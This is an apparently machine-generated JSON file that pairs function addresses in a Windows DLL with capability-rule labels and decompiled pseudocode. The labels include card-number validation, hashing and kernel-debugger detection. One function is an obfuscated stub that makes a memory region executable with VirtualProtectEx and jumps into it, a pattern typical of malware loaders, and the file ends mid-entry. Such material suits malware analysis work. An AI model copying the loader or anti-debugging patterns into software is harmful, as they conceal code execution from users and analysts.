{
    "10001000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid fcn.10001000(void)\n\n{\n    // [00] -r-x section size 172032 named .text\n    *0x10054748 = *0x10037328 + 0x400a523c;\n    return;\n}\n",
        "token_count": 55
    },
    "10029c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10029c20(int32_t arg_8h, code *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_18h;\n    uint dwSize;\n    uint flNewProtect;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x2e;\n    while ((1 < var_ch && (*0x100409b4 != *0x100409a4))) {\n        *0x100409b0 = *0x100409b4 * -0x55 + 0x55;\n        *(var_ch * 2 + 0x10040990) = *(var_ch * 2 + 0x10040990) + -0x55;\n        *0x100409b0 = *0x100409b0 - (*0x100409b4 + 0x2a);\n        var_ch = var_ch + -1;\n    }\n    if (*0x10040988 <= *0x100409b0) {\n        *0x100409b0 = *0x10040986 + *0x10040988 * -0x55;\n        *0x1004099a = *0x1004099a + *0x10040986;\n        *0x10040988 = *0x10040986 + 0xe5bd + *0x10040988;\n    }\n    *0x1004261c = arg_ch;\n    if ((*0x100409b4 & 0xffff) <= *0x10040986) {\n        *0x10040988 = *0x10040988 + 0xe5e7;\n        *0x100409a4 = *0x10040988;\n        *0x100409b0 = (*0x10040986 - 0x5e1f) + (*0x10040988 + 0xe5e7) * -3 +\n                      (((*0x10040988 + 0xe5ec) - *0x10040986) + *0x100409b0) * 2 + (*0x10040986 - 0x2b) * -2;\n    }\n    *0x10040988 = *0x10040988 + 0x1cbce;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(0x10041b50, 0x637);\n    uVar4 = *0x10040986;\n    iVar3 = -uVar4 + -0x5da1;\n    if (*0x10040a00 + *0x100409c8 == 0x130) {\n        *0x100409b0 = ((iVar1 * 2 + 0xe5c2) - *0x10040986) + *0x100409b0;\n    }\n    else {\n        *0x100409e8 = ((iVar1 + 5) - *0x10040986) + *0x100409e8;\n    }\n    *0x10040988 = iVar1 * 2 + 0xe5bd;\n    uVar2 = *0x10040986;\n    (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(0xffffffff, *0x1004261c, 0x518e, 0x40, 0x10042620);\n    var_ch = 0;\n    while ((var_ch < 0x1d && (*0x100409b4 != *0x100409a4))) {\n        *0x100409b0 = *(var_ch * 2 + 0x10040990) + *0x100409b0;\n        *0x100409b4 = *0x100409b0 + 0x3e + iVar3;\n        if (*0x100409b0 == *0x1004099a) break;\n        var_ch = var_ch + 2;\n    }\n    if ((*0x100409b0 & 0xffff) + *0x10040994 == 0x130) {\n        *0x100409b0 = ((*0x10040988 * 2 + 0xe5c2) - *0x10040986) + *0x100409b0;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + ((*0x10040988 + 5) - *0x10040986);\n    }\n    *0x10040988 = *0x10040988 * 2 + 0x87f1;\n    iVar1 = (uVar2 + 1 + iVar3) - (-uVar4 + *0x10040988);\n    *0x10040988 = arg_8h + iVar1 * -0x55;\n    if (*0x100409a0 == 9) {\n        arg_8h = (*0x10040988 + -5) - iVar1;\n    }\n    else {\n        *0x10040988 = arg_8h + 0xe5bd + *0x10040988;\n    }\n    *0x10040986 = 0xfb;\n    *0x10040988 = (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x637, 0x10041b50);\n    if ((*0x100409b0 & 0xffff) + *0x10040994 == 0x130) {\n        *0x10040988 = ((iVar1 * 2 + 0xe5c2) - arg_8h) + *0x10040988;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + ((iVar1 + 5) - arg_8h);\n    }\n    // WARNING: Could not recover jumptable at 0x1002a158. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1004261c)();\n    return;\n}\n",
        "token_count": 1338
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "100013f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.100013f0(uint arg_8h)\n\n{\n    char cVar1;\n    bool bVar2;\n    bool bVar3;\n    uint *puVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x1002a789;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar5 = *(in_ECX + 4);\n    if (iVar5 == 0) {\n        var_30h = 0xf;\n        var_44h._0_1_ = 0;\n        puVar4 = &var_44h;\n        bVar3 = true;\n        bVar2 = false;\n        var_34h = iVar5;\n    }\n    else {\n        pcVar7 = *(iVar5 + 0x18);\n        if (pcVar7 == NULL) {\n            pcVar7 = iVar5 + 0x1c;\n        }\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch._0_1_ = 0;\n        if (*pcVar7 == '\\0') {\n            iVar5 = 0;\n        }\n        else {\n            pcVar6 = pcVar7;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = pcVar6 - (pcVar7 + 1);\n        }\n        fcn.10002450(pcVar7, iVar5, var_14h);\n        puVar4 = &var_2ch;\n        bVar3 = false;\n        bVar2 = true;\n    }\n    fcn.10002240(puVar4);\n    if (bVar2) {\n        fcn.100021d0();\n    }\n    if (bVar3) {\n        fcn.100021d0();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.1000ac84(unaff_EDI);\n    return;\n}\n",
        "token_count": 604
    },
    "10003c90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall\nfcn.10003c90(int32_t **param_1, int32_t **param_2, int32_t **param_3, int32_t **param_4, int32_t *param_5)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t **ppiVar5;\n    int32_t **ppiVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint16_t *puVar9;\n    uint32_t uVar10;\n    int32_t **ppiVar11;\n    int32_t **unaff_retaddr;\n    \n    if (param_5 == NULL) {\n        param_5 = param_1[0x16];\n    }\n    if (param_3 != param_4) {\n        while (param_5 != NULL) {\n            ppiVar11 = param_4;\n    // switch table (21 cases) at 0x10003f2c\n            switch(param_5[1]) {\n            case 1:\n            case 8:\n            case 9:\n            case 0xd:\n            case 0xe:\n            case 0x14:\n                param_5 = param_5[3];\n                break;\n            case 2:\n                if ((*(param_1 + 0x18) & 1) == 0) goto code_r0x10003ce0;\n                goto code_r0x10003f1b;\n            case 3:\n                if ((*(param_1 + 0x18) & 2) == 0) goto code_r0x10003d10;\n                goto code_r0x10003f1b;\n            default:\n                goto code_r0x10003cf2;\n            case 6:\n                goto code_r0x10003d31;\n            case 7:\n                goto code_r0x10003d77;\n            case 0xc:\n            case 0x15:\n                param_5 = NULL;\n                break;\n            case 0x10:\n                goto code_r0x10003ef3;\n            }\n        }\n    }\n    goto code_r0x10003cf2;\ncode_r0x10003d77:\n    uVar2 = *param_3;\n    uVar10 = uVar2;\n    ppiVar5 = param_3;\n    if ((param_5[5] == 0) || (ppiVar6 = fcn.10005960(param_3, param_3 + 2),  *ppiVar6 == param_3)) {\n        if (param_5[8] != 0) {\n            uVar7 = uVar10;\n            if ((param_1[0x17] & 0x800) != 0) {\n                uVar7 = fcn.10004510(uVar10);\n                uVar7 = uVar7 & 0xffff;\n                ppiVar5 = param_2;\n                ppiVar11 = param_3;\n            }\n            uVar8 = 0;\n            if (*(param_5[8] + 4) != 0) {\n                iVar3 = *(param_5[8] + 8);\n                do {\n                    if ((*(iVar3 + uVar8 * 2) <= uVar7) && (uVar7 <= *(iVar3 + 2 + uVar8 * 2))) goto code_r0x10003eb9;\n                    uVar8 = uVar8 + 2;\n                } while (uVar8 < *(param_5[8] + 4));\n            }\n        }\n        if (uVar2 < 0x100) {\n            if ((param_5[6] == 0) || ((*((uVar2 >> 3) + param_5[6]) & 1 << (uVar2 & 7)) == 0)) {\ncode_r0x10003ec0:\n                uVar10 = 0;\n            }\n            else {\n                uVar10 = 1;\n            }\n        }\n        else {\n            iVar3 = param_5[7];\n            if (iVar3 != 0) {\n                puVar9 = *(iVar3 + 8);\n                puVar1 = puVar9 + *(iVar3 + 4);\n                if (puVar9 != puVar1) {\n                    do {\n                        if (*puVar9 == uVar2) break;\n                        puVar9 = puVar9 + 1;\n                    } while (puVar9 != puVar1);\n                    if (puVar9 != puVar1) {\n                        uVar10 = 1;\n                        goto code_r0x10003ec2;\n                    }\n                }\n            }\n            if ((*(param_5 + 9) == 0) ||\n               (ppiVar5 = unaff_retaddr,  cVar4 = fcn.10004470(uVar10, *(param_5 + 9)),  ppiVar11 = param_2, \n               unaff_retaddr = ppiVar5,  cVar4 == '\\0')) {\n                if ((param_5[10] == 0) ||\n                   (cVar4 = fcn.10005a00(param_1[0x1c]),  ppiVar5 = param_3,  ppiVar11 = param_4,  cVar4 == '\\0'))\n                goto code_r0x10003ec0;\ncode_r0x10003eb9:\n                uVar10 = 1;\n            }\n            else {\n                uVar10 = 1;\n            }\n        }\n    }\n    else {\n        uVar10 = 1;\n    }\ncode_r0x10003ec2:\n    param_3 = ppiVar5;\n    if (uVar10 != (param_5[2] & 1U)) goto code_r0x10003cf2;\n    param_3 = ppiVar5 + 2;\n    if (param_3 == ppiVar11) {\n        *param_2 = param_3;\n        return;\n    }\n    goto code_r0x10003d77;\ncode_r0x10003d31:\n    while( true ) {\n        ppiVar11 = param_3 + 2;\n        ppiVar5 = fcn.100058e0(param_3, ppiVar11, param_5[7] + 2, param_1[0x1c], param_1[0x17]);\n        if (*ppiVar5 != param_3) break;\n        param_3 = ppiVar11;\n        if (ppiVar11 == param_4) {\n            *param_2 = ppiVar11;\n            return;\n        }\n    }\n    goto code_r0x10003cf2;\ncode_r0x10003d10:\n    while (*param_3 != 10) {\n        param_3 = param_3 + 2;\n        if (param_3 == param_4) {\n            *param_2 = param_3;\n            return;\n        }\n    }\n    goto code_r0x10003cf2;\n    while( true ) {\n        param_4 = fcn.10003c90();\n        param_4 = *param_4;\n        param_5 = param_5[6];\n        if (param_1 == param_4) break;\ncode_r0x10003ef3:\n        if (param_5 == NULL) break;\n    }\ncode_r0x10003f1b:\n    *param_2 = param_4;\n    return;\n    while (param_3 = param_3 + 2,  param_3 != param_4) {\ncode_r0x10003ce0:\n        if (*(param_3 + -2) == 10) break;\n    }\ncode_r0x10003cf2:\n    *param_2 = param_3;\n    return;\n}\n",
        "token_count": 1718
    },
    "10005050": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nint16_t * __cdecl fcn.10005050(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    char *pcVar11;\n    int16_t *piVar12;\n    uchar (*in_ECX) [16];\n    uint8_t *extraout_ECX;\n    uint8_t uVar13;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint32_t uVar14;\n    int32_t *piVar15;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    bool bVar16;\n    bool bVar17;\n    char cVar18;\n    char cVar19;\n    uchar in_XMM0 [16];\n    uint64_t uVar20;\n    uint uVar21;\n    uint in_stack_ffffffb8;\n    uint var_30h;\n    uint var_2ch;\n    uint in_stack_ffffffd4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a9d8;\n    var_ch = *in_FS_OFFSET;\n    uVar8 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.10005050::var_ch;\n    if ((0 < *(in_ECX[7] + 0xc)) && (iVar9 = *(in_ECX[7] + 0xc) + -1,  *(in_ECX[7] + 0xc) = iVar9,  iVar9 < 1)) {\n        in_stack_ffffffb8 = 0xc;\n        fcn.1000a231(0xc);\n    }\n    if ((0 < *(in_ECX[7] + 8)) && (iVar9 = *(in_ECX[7] + 8) + -1,  *(in_ECX[7] + 8) = iVar9,  iVar9 < 1)) {\n        fcn.1000a231(0xb);\n    }\n    bVar17 = false;\n    if (arg_8h != NULL) {\n        do {\n            piVar15 = 0x1;\n            uVar3 = arg_8h[1];\n            uVar14 = uVar3 - 1;\n            cVar19 = SBORROW4(uVar14, 0x14);\n            cVar18 = uVar3 - 0x15 < 0;\n            if (0x14 < uVar14) {\n                uVar20 = fcn.1000a231(0xd);\n                puVar10 = uVar20;\n                if (cVar19 == cVar18) {\ncode_r0x10005498:\n                    pcVar6 = swi(3);\n                    piVar12 = (*pcVar6)();\n                    return piVar12;\n                }\n                uVar7 = *puVar10;\n                uVar13 = uVar20 >> 0x20;\n                *puVar10 = *puVar10 + uVar13;\n                pcVar11 = uVar20 & 0xffffff00ffffff00 | -CARRY1(uVar7, uVar13);\n                *pcVar11 = *pcVar11 + uVar13;\n                uVar13 = uVar13 | *extraout_ECX;\n                uVar8 = (uVar20 & 0xffffff00ffffff00) >> 0x20 | uVar13;\n                extraout_ECX[uVar8 * 2] = extraout_ECX[uVar8 * 2] + (extraout_ECX >> 8);\n                *pcVar11 = *pcVar11 + uVar13;\n                (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                cVar18 = (*in_ECX)[0];\n                (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                if (SCARRY1(cVar18, uVar13) == (*in_ECX)[0] < '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                cVar18 = (*in_ECX)[0];\n                (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                if (SCARRY1(cVar18, uVar13) == (*in_ECX)[0] < '\\0') {\n                    piVar15 = 0x2;\n                    in_ECX = *0x4a;\n                }\n                else {\n                    uVar7 = (*in_ECX)[0];\n                    (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                    rsqrtps(in_XMM0, *in_ECX);\n                    *pcVar11 = *pcVar11 + extraout_ECX + CARRY1(uVar7, uVar13);\n                    (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                    (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                    (*in_ECX)[0] = (*in_ECX)[0] + uVar13;\n                    uVar14 = *arg_8h;\n                    *0x7d100054 = *0x7d100054 + in_ECX + (uVar8 < *arg_8h);\n                    cVar19 = uVar8 - uVar14;\n                    (*in_ECX)[0] = (*in_ECX)[0] + cVar19;\n                    cVar18 = (*in_ECX)[0];\n                    *0xcd100053 = in_ECX;\n                    (*in_ECX)[0] = (*in_ECX)[0] + cVar19;\n                    if (SCARRY1(cVar18, cVar19) != (*in_ECX)[0] < '\\0') {\n                        (*in_ECX)[0] = (*in_ECX)[0] + cVar19;\n                        pcVar11 = in(uVar8 - uVar14);\n                        *pcVar11 = *pcVar11 + cVar19;\n                        goto code_r0x10005498;\n                    }\n                }\n                piVar12 = in_ECX[0x100055c][10];\n    // switch table (116 cases) at 0x100055ac\n                switch(in_ECX) {\n                case 0xa:\n                    if ((*(piVar15 + 0x14) & 4) == 0) {\n                        return piVar12;\n                    }\n                    if (piVar15[4] != 0) {\n                        return piVar12;\n                    }\n                    piVar15[0x13] = 0x7c;\n                    return piVar12;\n                default:\n                    goto code_r0x100055a9;\n                case 0x24:\n                    if ((piVar15[0x14] & 0x2000000U) == 0) {\n                        return piVar12;\n                    }\n                    piVar12 = *piVar15 + 2;\n                    if (piVar12 == piVar15[2]) {\n                        return piVar12;\n                    }\n                    if (*piVar12 == 10) {\n                        return piVar12;\n                    }\n                    piVar15[0x13] = 0;\n                    return piVar12;\n                case 0x28:\n                case 0x29:\n                    bVar17 = (*(piVar15 + 0x14) & 8) == 0;\n                    break;\n                case 0x2a:\n                    if ((piVar15[0x14] & 0x4000000U) == 0) {\n                        return piVar12;\n                    }\n                    piVar12 = fcn.10006a70();\n                    if (piVar12 == '\\0') {\n                        return piVar12;\n                    }\n                    piVar15[0x13] = 0;\n                    return piVar12;\n                case 0x2b:\n                case 0x3f:\n                    bVar17 = (*(piVar15 + 0x14) & 1) == 0;\n                    break;\n                case 0x5c:\n                    piVar12 = fcn.10006760();\n                    if (piVar12 == '\\0') {\n                        return piVar12;\n                    }\n                    uVar2 = *(*piVar15 + 2);\n                    *(piVar15 + 0x12) = uVar2;\n                    piVar15[0x13] = uVar2;\n                    return uVar2;\n                case 0x5e:\n                    if ((piVar15[0x14] & 0x2000000U) == 0) {\n                        return piVar12;\n                    }\n                    piVar12 = fcn.10006a70();\n                    bVar17 = piVar12 == '\\0';\n                    break;\n                case 0x7b:\n                case 0x7d:\n                    bVar17 = (*(piVar15 + 0x14) & 0x10) == 0;\n                    break;\n                case 0x7c:\n                    bVar17 = (*(piVar15 + 0x14) & 2) == 0;\n                }\n                if (bVar17) {\n                    piVar15[0x13] = 0;\n                }\ncode_r0x100055a9:\n                return piVar12;\n            }\n    // switch table (21 cases) at 0x10005444\n            switch(*(uVar14 * 4 + 0x10005444)) {\n            case 0x100050d6:\n                if ((*in_ECX[6] & 0x101) == 1) {\ncode_r0x10005125:\n                    bVar17 = true;\n                    goto code_r0x10005299;\n                }\n                if (((*in_ECX[6] & 0x100) != 0) || (**in_ECX != *(in_ECX[4] + 0xc))) {\n                    bVar17 = *(**in_ECX + -2) != 10;\n                }\n                break;\n            case 0x1000510a:\n                if (((in_ECX[6][0] & 2) != 0) || ((**in_ECX != *in_ECX[5] && (***in_ECX != 10)))) goto code_r0x10005125;\n                break;\n            case 0x1000512c:\n                if ((((*in_ECX[6] & 4) == 0) || (**in_ECX != *(in_ECX[4] + 0xc))) &&\n                   (((*in_ECX[6] & 8) == 0 || (**in_ECX != *in_ECX[5])))) {\n                    if ((**in_ECX == *in_ECX[5]) || (uVar2 = ***in_ECX,  uVar2 != uVar2)) {\ncode_r0x10005174:\n                        arg_8h._3_1_ = '\\0';\n                    }\n                    else {\n                        iVar9 = fcn.1000cfb0(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_\", uVar2);\n                        arg_8h._3_1_ = '\\x01';\n                        if (iVar9 == 0) goto code_r0x10005174;\n                    }\n                    cVar18 = fcn.100064c0(**in_ECX, 0xffffffff);\n                    bVar16 = cVar18 != arg_8h._3_1_;\n                }\n                else {\n                    bVar16 = false;\n                }\n                if (bVar16 == (*(arg_8h + 2) & 1)) goto code_r0x10005125;\n                break;\n            case 0x10005197:\n                piVar12 = **in_ECX;\n                if (((piVar12 == *in_ECX[5]) || (*piVar12 == 10)) || (*piVar12 == 0xd)) goto code_r0x10005125;\n                **in_ECX = piVar12 + 1;\n                break;\n            case 0x100051bd:\n                piVar15 = fcn.100058e0(**in_ECX, *in_ECX[5], arg_8h[7] + arg_8h[6] * 2, *in_ECX[7], *(in_ECX[5] + 0xc));\n                if (*piVar15 == **in_ECX) goto code_r0x10005125;\n                **in_ECX = *piVar15;\n                break;\n            case 0x100051ee:\n                if ((**in_ECX == *in_ECX[5]) ||\n                   (cVar18 = fcn.10006520(arg_8h, in_stack_ffffffb8, uVar8, unaff_EDI, unaff_ESI, unaff_EBX, var_30h, \n                                          var_2ch, in_stack_ffffffd4),  cVar18 == '\\0')) goto code_r0x10005125;\n                bVar17 = false;\n                goto code_r0x10005284;\n            case 0x1000520f:\n                var_30h = **in_ECX;\n                fcn.10005f40(*in_ECX + 4);\n                uVar21 = *in_ECX[1];\n                var_4h = 0;\n                cVar18 = fcn.10005050(arg_8h[5]);\n                if (cVar18 == (uVar3 == 0xb)) {\n                    **in_ECX = var_30h;\n                    *in_ECX[1] = uVar21;\n                    fcn.10005e50(&fcn.10005050::var_2ch);\n                    bVar17 = true;\n                }\n                else {\n                    **in_ECX = var_30h;\n                }\n                var_4h = 0xffffffff;\n                fcn.10003a70();\n                break;\n            case 0x100052bd:\n                *(*(in_ECX[1] + 4) + arg_8h[5] * 8) = **in_ECX;\n                uVar14 = *in_ECX[1];\n                if (arg_8h[5] < uVar14) {\n                    do {\n                        uVar14 = uVar14 - 1;\n                        puVar1 = *(*in_ECX + 4) + (uVar14 >> 5) * 4;\n                        *puVar1 = *puVar1 & ~(1 << (uVar14 & 0x1f));\n                    } while (arg_8h[5] < uVar14);\n                }\n                break;\n            case 0x100052ef:\n                uVar14 = arg_8h[5];\n                if ((in_ECX[6][5] != '\\0') || (*(uVar14 + 0x14) != 0)) {\n                    puVar1 = *(*in_ECX + 4) + (*(uVar14 + 0x14) >> 5) * 4;\n                    *puVar1 = *puVar1 | 1 << (*(uVar14 + 0x14) & 0x1f);\n                    *(*(in_ECX[1] + 4) + 4 + *(uVar14 + 0x14) * 8) = **in_ECX;\n                }\n                break;\n            case 0x1000532b:\n                uVar14 = arg_8h[5];\n                if ((*(*(*in_ECX + 4) + (uVar14 >> 5) * 4) & 1 << (uVar14 & 0x1f)) != 0) {\n                    iVar9 = **in_ECX;\n                    piVar15 = *(in_ECX[1] + 4) + uVar14 * 8;\n                    iVar4 = *piVar15;\n                    iVar5 = piVar15[1];\n                    if (iVar4 != iVar5) {\n                        piVar15 = fcn.10006c60(iVar9, *in_ECX[5], iVar4, iVar5, *(in_ECX[5] + 0xc));\n                        iVar9 = *piVar15;\n                        if (iVar9 == **in_ECX) goto code_r0x10005125;\n                    }\n                    **in_ECX = iVar9;\n                }\n                break;\n            case 0x10005386:\n                cVar18 = fcn.10005fd0(arg_8h);\n                if (cVar18 == '\\0') {\n                    bVar17 = true;\n                }\ncode_r0x1000539c:\n                arg_8h = NULL;\n                break;\n            case 0x1000539c:\n                goto code_r0x1000539c;\n            case 0x100053a3:\n                uVar7 = arg_8h[2] >> 1;\n                uVar21 = 0;\ncode_r0x100053b1:\n                cVar18 = fcn.100062f0(arg_8h, uVar7 & 1, uVar21);\n                if (cVar18 == '\\0') {\n                    bVar17 = true;\n                }\n                goto code_r0x100053c6;\n            case 0x100053cd:\n                arg_8h = arg_8h[5];\n                if (arg_8h[9] == 0) {\n                    uVar21 = *(*in_ECX[4] + arg_8h[8] * 8);\n                    uVar7 = arg_8h[2] >> 1;\n                    goto code_r0x100053b1;\n                }\ncode_r0x100053c6:\n                arg_8h = NULL;\n                break;\n            case 0x100053ed:\n                if ((((*in_ECX[6] & 0x2020) == 0) || (*(in_ECX[4] + 0xc) != **in_ECX)) &&\n                   ((in_ECX[7][4] == '\\0' || (**in_ECX == *in_ECX[5])))) {\n                    if ((in_ECX[6][4] != '\\0') && (cVar18 = fcn.100066b0(),  cVar18 == '\\0')) goto code_r0x100053c6;\n                    fcn.10005ce0();\n                    in_ECX[6][4] = 1;\n                    arg_8h = NULL;\n                }\n                else {\n                    bVar17 = true;\n                    arg_8h = NULL;\n                }\n            }\n            if (bVar17) break;\ncode_r0x10005284:\n            if ((arg_8h == NULL) || (arg_8h = arg_8h[3],  arg_8h == NULL)) break;\n        } while( true );\n    }\ncode_r0x10005299:\n    uVar8 = *(in_ECX[7] + 0xc);\n    if (0 < uVar8) {\n        uVar8 = uVar8 + 1;\n        *(in_ECX[7] + 0xc) = uVar8;\n    }\n    *in_FS_OFFSET = var_ch;\n    return uVar8 & 0xffffff00 | !bVar17;\n}\n",
        "token_count": 4329
    },
    "10006520": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.10006520(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint16_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint8_t uVar5;\n    uint16_t **ppuVar6;\n    uint32_t uVar7;\n    uint16_t **in_ECX;\n    uint32_t uVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint32_t uVar11;\n    int32_t var_8h;\n    \n    uVar11 = **in_ECX;\n    if ((in_ECX[0x17] & 0x100) != 0) {\n        pcVar2 = **(in_ECX[0x1c] + 2);\n        if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n            uVar11 = fcn.1000a294(uVar11, *(in_ECX[0x1c] + 2) + 2);\n        }\n        else {\n            uVar11 = (**(pcVar2 + 0x20))(uVar11);\n        }\n        uVar11 = uVar11 & 0xffff;\n    }\n    puVar10 = *in_ECX + 1;\n    if (*(var_8h + 0x14) != 0) {\n        ppuVar6 = fcn.10005960(*in_ECX, in_ECX[0x14]);\n        if (*ppuVar6 != *in_ECX) {\n            uVar11 = 1;\n            puVar10 = *ppuVar6;\n            goto code_r0x1000667d;\n        }\n    }\n    if (*(var_8h + 0x20) != 0) {\n        uVar7 = uVar11;\n        if ((in_ECX[0x17] & 0x800) != 0) {\n            uVar7 = fcn.10004510(uVar11);\n            uVar7 = uVar7 & 0xffff;\n        }\n        uVar8 = 0;\n        if (*(*(var_8h + 0x20) + 4) != 0) {\n            iVar3 = *(*(var_8h + 0x20) + 8);\n            do {\n                if ((*(iVar3 + uVar8 * 2) <= uVar7) && (uVar7 <= *(iVar3 + 2 + uVar8 * 2))) goto code_r0x10006674;\n                uVar8 = uVar8 + 2;\n            } while (uVar8 < *(*(var_8h + 0x20) + 4));\n        }\n    }\n    if (uVar11 < 0x100) {\n        if (*(var_8h + 0x18) != 0) {\n            uVar5 = *((uVar11 >> 3) + *(var_8h + 0x18)) & 1 << (uVar11 & 7);\ncode_r0x10006672:\n            if (uVar5 != 0) {\ncode_r0x10006674:\n                uVar11 = 1;\n                goto code_r0x1000667d;\n            }\n        }\n    }\n    else {\n        iVar3 = *(var_8h + 0x1c);\n        if (iVar3 != 0) {\n            puVar9 = *(iVar3 + 8);\n            puVar1 = puVar9 + *(iVar3 + 4);\n            if (puVar9 != puVar1) {\n                do {\n                    if (*puVar9 == uVar11) break;\n                    puVar9 = puVar9 + 1;\n                } while (puVar9 != puVar1);\n                if (puVar9 != puVar1) {\n                    uVar11 = 1;\n                    goto code_r0x1000667d;\n                }\n            }\n        }\n        if ((*(var_8h + 0x24) != 0) && (cVar4 = fcn.10004470(uVar11, *(var_8h + 0x24)),  cVar4 != '\\0')) {\n            uVar11 = 1;\n            goto code_r0x1000667d;\n        }\n        if (*(var_8h + 0x28) != 0) {\n            uVar5 = fcn.10005a00(in_ECX[0x1c]);\n            goto code_r0x10006672;\n        }\n    }\n    uVar11 = 0;\ncode_r0x1000667d:\n    if (uVar11 != (*(var_8h + 8) & 1)) {\n        *in_ECX = puVar10;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1102
    },
    "10007dc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
